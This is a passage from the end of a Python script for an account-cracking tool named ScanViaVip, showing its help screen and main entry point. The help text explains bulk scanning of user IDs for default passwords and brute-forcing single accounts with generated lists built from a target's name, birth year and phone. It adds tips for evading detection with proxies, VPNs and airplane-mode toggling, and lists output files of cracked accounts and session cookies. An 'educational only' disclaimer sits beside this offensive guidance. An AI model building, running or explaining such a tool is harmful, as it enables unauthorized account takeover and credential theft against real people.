    if view in file_map and file_map[view].exists():
        console.clear()
        console.print(f"[bold cyan]Contents of {file_map[view].name}:[/]")
        with open(file_map[view]) as f:
            for i, line in enumerate(f):
                if i >= 50:
                    console.print(f"[dim]... and more[/]")
                    break
                console.print(f"  {line.strip()}")
    
    console.input("\n[bold]Press Enter to continue...[/]")

def show_help():
    console.clear()
    help_text = f"""
[bold cyan]╔══════════════════════════════════════════════════════════════════╗
║                    📖 {Config.TOOL_NAME} HELP GUIDE                       ║
╚══════════════════════════════════════════════════════════════════╝[/]

[bold yellow]🚀 QUICK START[/]
  1. Go to Settings → Set thread count (50-100 recommended)
  2. Add proxies if available (Settings → Add/Load Proxies)
  3. Use Fast Scan for bulk UID scanning
  4. Use BruteForce for targeted attacks

[bold yellow]📊 MODES EXPLAINED[/]

  [bold green]🔍 Fast Scan:[/]
  - Scans many UIDs with limited passwords (fast)
  - Best for finding accounts with default passwords
  - Choose UID series based on target year

  [bold red]💀 BruteForce:[/]
  - Attacks single UID with massive password list
  - Use Password Generator to create smart lists
  - Higher thread count = faster but more detection risk

  [bold cyan]🔧 Password Generator:[/]
  - Mode 1: Generate from name, birth year, phone
  - Mode 2: Auto-generate thousands of passwords
  - Mode 3: Combine multiple password files

[bold yellow]⚡ PERFORMANCE TIPS[/]
  ✨ Use VPN (1.1.1.1 recommended)
  ✨ Enable Airplane Mode for 10s between scans
  ✨ Use proxies to distribute requests
  ✨ Set threads based on your network speed
  ✨ Scan during off-peak hours (late night)

[bold yellow]📁 OUTPUT FILES[/]
  All results saved in: {Config.RESULTS_DIR}
  ├── live_accounts.txt    - Working accounts
  ├── 2fa_accounts.txt     - 2FA-enabled accounts
  ├── cracked_accounts.txt - Successfully cracked
  ├── dead_accounts.txt    - Dead/disabled accounts
  └── cookies.json         - Session cookies

[bold yellow]⚠ WARNING[/]
  This tool is for EDUCATIONAL and SECURITY TESTING only.
  Only use on accounts YOU OWN or have permission to test.
  Unauthorized access is ILLEGAL and UNETHICAL.

[bold cyan]╔══════════════════════════════════════════════════════════════════╗
║              Made by {Config.AUTHOR} - ScanViaVip v{Config.VERSION}              ║
╚══════════════════════════════════════════════════════════════════╝[/]
"""
    console.print(help_text)
    console.input("\n[bold]Press Enter to continue...[/]")

# ============================================================
# MAIN ENTRY POINT
# ============================================================
if __name__ == '__main__':
    try:
        # Setup
        os.system('clear' if os.name != 'nt' else 'cls')
        
        # Auto-load proxies if file exists
        proxy_file = Config.BASE_DIR / Config.PROXY_FILE
        if proxy_file.exists():
            Config.PROXY_LIST = ProxyManager.load_from_file(str(proxy_file))
        
        # Run
        menu_main()
        
    except KeyboardInterrupt:
        console.print(f"\n[bold red]🛑 Interrupted! {Config.TOOL_NAME} stopped.[/]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[bold red]💥 Error: {e}[/]")
        console.input("Press Enter to exit...")
        sys.exit(1)